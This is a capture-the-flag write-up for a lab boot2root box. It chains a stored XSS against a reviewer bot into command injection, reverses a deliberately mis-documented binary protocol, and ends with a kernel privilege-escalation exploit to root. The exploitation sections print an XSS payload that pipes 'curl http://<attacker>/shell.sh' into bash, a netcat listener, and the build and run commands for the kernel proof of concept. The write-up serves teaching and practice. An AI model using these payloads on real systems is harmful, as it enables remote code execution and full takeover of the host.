# Dont Trust Me

**Category:** boot2root · **Points:** 488 · **Solves:** 3 · **Flag:** `isfcr{h34p_gr00m1ng_b34ts_th3_4g3nt}`

## Challenge

> `https://tryhackme.com/jr/isfcrctf` — Flag format: `isfcr{...}`

A TryHackMe-style boot2root. The name is the whole hint: *Don't Trust Me.* The
box is littered with flag-shaped strings in banners, backups and service
documentation — almost all of them are decoys. The scored flag is the root
flag from `/root/root.txt`.

> The official hosting is an authorized, disposable TryHackMe room. The target
> IP changes on every redeploy, so everything below uses `<target>` as a
> placeholder.

## Initial Analysis

A full port scan showed three services:

```
22/tcp   open  ssh
80/tcp   open  http       (Express — "Palimpsest Document Review")
8080/tcp open  http-proxy (a fake "LegacyFTP" banner)
```

Port 8080 immediately dangled a flag in your face:

```
220 LegacyFTP 2.3.4 ready (vsFTPd-like) note=isfcr{ftp_4n0nym0us_r34d_wr1t3_0k}
```

That is decoy #1. Given the box name, every easy answer gets treated as
*evidence*, not truth.

The port-80 landing page (`recon/index-80.txt`) documented a realtime review
protocol and — in an HTML comment — pointed at a staff console:

```html
<p>Submissions go through the realtime review channel at <code>/ws</code>.
Protocol: send {"type":"CLAIM"} ... then {"type":"SUBMIT","nonce":..,"title":..,"comment":..}</p>
<!-- reviewer console at /admin (staff only) -->
```

It also states *"A human reviewer opens new drafts shortly after submission."*
That sentence is a flashing neon sign for **stored XSS against an authenticated
reviewer bot**.

## Vulnerability / Core Concept

The solve chains four distinct bugs, ending in a kernel LPE:

```
stored XSS in a WebSocket submission
  -> JS runs in the reviewer's authenticated origin
  -> authenticated /admin/diag command injection -> shell as www-data
  -> identify the real (vulnerable) kernel behind the PAL/decoy noise
  -> DirtyFrag (CVE-2026-43284) local privilege escalation -> root
```

**1. Stored XSS → reviewer context.** Draft `title`/`comment` are stored and
re-rendered to the reviewer bot without HTML neutralisation. JS executed in the
reviewer origin can issue same-origin requests carrying the bot's privileged
session automatically — more robust than trying to steal a specific cookie.

**2. Command injection in `/admin/diag`.** The staff-only diagnostic endpoint
builds `ping -c 1 -W 1 <host>` via an `exec`-style API, so shell metacharacters
in `host` are interpreted:

```
127.0.0.1; id        # runs id after the ping
```

Driving that endpoint *through the reviewer's XSS* turns it into RCE as
`www-data`:

```html
<script>
fetch('/admin/diag?host=' + encodeURIComponent(
  '127.0.0.1; curl -fsS http://<attacker>/shell.sh | bash'));
</script>
```

**3. The lying PAL service (a rabbit hole, by design).** Files under
`/opt/palsvc` describe a privileged maintenance channel, and the published
README is *deliberately wrong*. Reversing the included `palclient` binary showed
the documentation and the real protocol disagree on nearly every field:

| Field            | README says | Actual (from `palclient`)          |
|------------------|-------------|------------------------------------|
| Magic            | `PAL1`      | `PAL0`                             |
| Length           | big-endian  | 16-bit little-endian, payload + 4  |
| Integrity        | CRC32       | CRC16 LE, init `0xabcd`, poly `0x1337` |
| Auth opcode      | `0x10`      | `0x1e` (`0x10` is *health*, `0x20` exec) |

The PAL health response coughs up another decoy
(`isfcr{p4lsvc_c0ntr0l_ch4nn3l_0wn3d}`). The intended route likely pivots to the
`reviewer` user and the `palmaint` SUID helper — but that wasn't needed to root.

**4. DirtyFrag kernel LPE.** From the `www-data` shell, `uname -a` reported
`5.4.0-216-generic` — inside the vulnerable range for **DirtyFrag
(CVE-2026-43284)** (the Ubuntu 5.4 fix only landed in `5.4.0-231`). The box also
shipped `gcc`, making the public PoC trivial to build on-target.

## Exploitation

**Submit the XSS draft** with `ws_submit.py` (handles the CLAIM/SUBMIT nonce
exchange; reads the host from a local `target.txt`):

```bash
echo "<target>" > target.txt
python3 ws_submit.py '<script>fetch("/admin/diag?host=127.0.0.1;curl -fsS http://<attacker>/shell.sh|bash")</script>' 'comment'
```

With a listener + web server up (`nc -lvnp 4444`, `python3 -m http.server 8000`),
the reviewer bot renders the draft and the callback lands as `www-data`.

**Escalate with DirtyFrag.** Pull the PoC (public research repo `V4bel/dirtyfrag`),
review it, drop it on target, and build/run it:

```bash
gcc -O0 -Wall -o /tmp/df /tmp/df.c -lutil
DIRTYFRAG_VERBOSE=1 /tmp/df --force-esp
```

The successful run installed 48 XFRM security associations, wrote 192 bytes into
`/usr/bin/su`'s page cache, patched the entry near offset `0x78`, and dropped a
root shell (`uid=0(root)`). Because it mutates a privileged binary's cached
pages, it's destructive — fine on a throwaway VM, never on a real host.

**Separating real from fake.** The box is full of flag-shaped strings:

```
port 8080 banner   -> isfcr{ftp_4n0nym0us_r34d_wr1t3_0k}      (decoy)
PAL health reply   -> isfcr{p4lsvc_c0ntr0l_ch4nn3l_0wn3d}     (decoy)
/backup/flag.txt   -> isfcr{b4ckup_4rch1v3_r3st0r3_k3y}       (decoy)
/home/reviewer/user.txt -> isfcr{r3v13w3r_p1v0t_v14_ly1ng_d0cs}  (user flag)
/root/root.txt     -> isfcr{h34p_gr00m1ng_b34ts_th3_4g3nt}    (SCORED root flag)
```

## Flag

```
isfcr{h34p_gr00m1ng_b34ts_th3_4g3nt}
```

User flag (readable once root): `isfcr{r3v13w3r_p1v0t_v14_ly1ng_d0cs}`

## Included files

- `ws_submit.py` — WebSocket CLAIM/SUBMIT helper that delivers the stored XSS draft.
- `palclient` — the provided PAL client binary (stripped ELF, ~14 KB) that was reversed to recover the real protocol.
- `recon/index-80.txt`, `recon/8080-banner.txt` — recon artifacts showing the `/admin` hint and the first decoy flag.

## Key Takeaways

- **Decoys everywhere.** Treat banners, backup files and service docs as
  untrusted evidence; verify every flag-shaped string against where it actually
  came from.
- Stored XSS against a privileged bot is a clean way to reach *authenticated*
  internal endpoints — use the browser's own session instead of stealing a cookie.
- When a binary protocol's public docs are suspiciously detailed, reverse the
  client: here the README lied about magic, endianness, checksum and opcodes.
- Always fingerprint the kernel on a low-priv shell — `5.4.0-216` was in the
  DirtyFrag (CVE-2026-43284) window and `gcc` was present.
